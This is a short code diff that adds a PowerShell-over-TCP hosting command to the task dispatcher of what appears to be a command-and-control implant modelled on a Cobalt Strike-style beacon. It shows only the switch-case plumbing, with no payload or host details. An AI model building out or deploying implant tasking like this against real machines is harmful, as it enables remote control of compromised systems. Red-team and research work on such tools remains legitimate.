@@ -60,6 +60,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_TCP_CONNECT:
 			LinkViaTcp(buffer, size);
 			break;
+		case COMMAND_PSH_HOST_TCP:
+			PowershellHostTcp(buffer, size);
+			break;
 		case COMMAND_JOB_SPAWN_X86:
 			JobSpawn(buffer, size, TRUE, TRUE);
 			break;
